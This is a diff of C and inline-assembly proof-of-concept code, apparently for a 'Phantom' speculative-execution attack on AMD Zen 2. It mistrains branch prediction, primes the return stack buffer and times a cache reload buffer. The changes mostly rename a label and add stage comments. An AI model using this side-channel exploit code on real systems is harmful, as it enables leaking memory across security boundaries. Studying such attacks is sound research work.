@@ -22,11 +22,12 @@
 
 #define PTRN 0x100100000000UL // Zen 2
 
-// Random address of Phantom Call
+// Defining a random address for PHANTOM_CALL
 #define PHANTOM_CALL        0x40000000UL
 
 #define ROUNDS 10000
 
+// Define the MMAP flags
 #define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_FIXED_NOREPLACE)
 #define PROT_RW    (PROT_READ | PROT_WRITE)
 #define PROT_RWX   (PROT_RW | PROT_EXEC)
@@ -69,12 +70,13 @@ __attribute__((aligned(4096))) static uint64_t results30[RB_SLOTS] = {0};
 __attribute__((aligned(4096))) static uint64_t results31[RB_SLOTS] = {0};
 
 
-// nop slide alias
-#define NOPS_str(n)                                                                      \
-    ".rept " xstr(n) "\n\t"                                                              \
-                     "nop\n\t"                                                           \
-                     ".endr\n\t"
+// alias for generating n nops
+#define NOPS_str(n)            \
+    ".rept " xstr(n) "\n\t"    \
+    "nop\n\t"                  \
+    ".endr\n\t"
 
+// alias for turning integers into strings
 #define str(s)  #s
 #define xstr(s) str(s)
 
@@ -184,9 +186,12 @@ asm(".align 0x1000\n\t"
     "jmp *%r10\n\t"
     "leak_end:\n\t");
 
-void phantom_jump_insert();
+
+void PHANTOM_JUMP();
 
 int main(int argc, char *argv[]) {
+    // STAGE 1: SETUP
+    
     // We first allocate the reload buffer
     // This is the buffer we use to measure cache timings
     if (mmap((void *) RB_PTR, ((RB_SLOTS + 1) << RB_STRIDE_BITS), PROT_RW, MMAP_FLAGS, -1,
@@ -229,7 +234,9 @@ int main(int argc, char *argv[]) {
     // remove when done with threshold testing
     // return 0;
 
-    uint64_t jmp_fn_train_alias = (uint64_t) phantom_jump_insert ^ PTRN;
+
+    // STAGE 2: ALLOCATING THE JUMP AND CALL
+    uint64_t jmp_fn_train_alias = (uint64_t) PHANTOM_JUMP ^ PTRN;
     uint64_t call_fn_train_alias = (uint64_t) PHANTOM_CALL ^ PTRN;
 
     if (mmap((void *) (jmp_fn_train_alias & ~0xfff), 0x1000, PROT_RWX, MMAP_FLAGS, -1, 0) == MAP_FAILED ) {
@@ -254,12 +261,12 @@ int main(int argc, char *argv[]) {
     
     printf("Address of PHANTOM_CALL:        0x%16lx\n", (unsigned long)PHANTOM_CALL);
     printf("Address of CALL_FN_TRAIN_ALIAS: 0x%16lx\n", (unsigned long)call_fn_train_alias);
-    printf("Address of PHANTOM_JMP:         0x%16lx\n", (unsigned long)phantom_jump_insert);
+    printf("Address of PHANTOM_JMP:         0x%16lx\n", (unsigned long)PHANTOM_JUMP);
     printf("Address of JMP_FN_TRAIN_ALIAS:  0x%16lx\n", (unsigned long)jmp_fn_train_alias);
     
     for (int i = 0; i < ROUNDS; i++) {
 #if 1
-        // Inserting PhantomJMP
+        // STAGE 3: Inserting PhantomJMP
         // clang-format off
         asm("mov $1f, %%r10\n\t"
             "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
@@ -267,7 +274,7 @@ int main(int argc, char *argv[]) {
             "1:\n\t" ::[phantom_train] "r"(jmp_fn_train_alias)
             : "r8", "r10");
 
-        // Inserting recursive PhantomCALL
+        // STAGE 4: Inserting recursive PhantomCALL
         asm("mov $1f, %%r10\n\t"
             "mov $" xstr(PHANTOM_CALL) ", %%r8\n\t"
             "jmp *%[phantom_jump]\n\t"
@@ -275,7 +282,8 @@ int main(int argc, char *argv[]) {
             : "r8", "r9", "r10");
 #endif 
 
-        // Priming RSB state
+
+        // STAGE 5: Priming RSB state
         asm(".index=0\n\t"
             ".rept " xstr(RSB_SIZE) "\n\t"
             "call 4f\n\t"
@@ -287,19 +295,19 @@ int main(int argc, char *argv[]) {
             ".index=.index+1\n\t"
             ".endr\n\t" ::: "r8", "r9");
 
-        // PhantomJMP will be triggered
+        // STAGE 6: Triggering PhantomJMP
         asm(
             NOPS_str(512)
-            "jmp phantom_jump_insert\n\t"
+            "jmp PHANTOM_JUMP\n\t"
             "a:\n\t"
             NOPS_str(512)
             NOPS_str(512)
-            "phantom_jump_insert:\n\t"
+            "PHANTOM_JUMP:\n\t"
             NOPS_str(512)
         );
         // clang-format on
 
-        // Execute RSB_SIZE returns
+        // STAGE 7: Execute RSB_SIZE returns
         for (int k = 0; k < RSB_SIZE; k++) {
             flush_range(RB_PTR, 1 << RB_STRIDE_BITS, RB_SLOTS);
             asm("mfence\n\t"
